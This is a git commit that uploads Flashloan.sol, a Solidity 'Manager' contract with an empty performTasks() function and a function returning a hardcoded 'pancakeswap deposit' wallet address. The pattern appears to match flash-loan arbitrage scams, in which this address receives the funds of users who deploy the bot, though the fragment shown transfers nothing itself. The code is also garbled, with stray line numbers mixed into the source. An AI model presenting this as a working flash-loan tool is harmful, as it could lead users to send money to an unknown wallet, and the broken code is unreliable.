6aac4265a412a9690f305c2cc31fe253c5f3375e
FlashLoan 01 <48298536+Flash-Loan01@users.noreply.github.com>
2022-05-12 15:29:42 -0300

    Add files via upload

---
+++ Flashloan.sol
@@ -0,0 +1,24 @@
+1 pragma solidity ^0.5.0;
+2
+3 
+
+contract Manager {
+
+4    function performTasks() public pure{
+
+5
+6
+    }
+
+7
+8
+    function pancakeswapDepositAddress() public pure returns (address) {
+
+9        return 0x0880366767C77B9956C7fa0412B4a0DC99748777;
+
+10   }
+11 }
+12
+
+
+13 //pancakeswapfunction
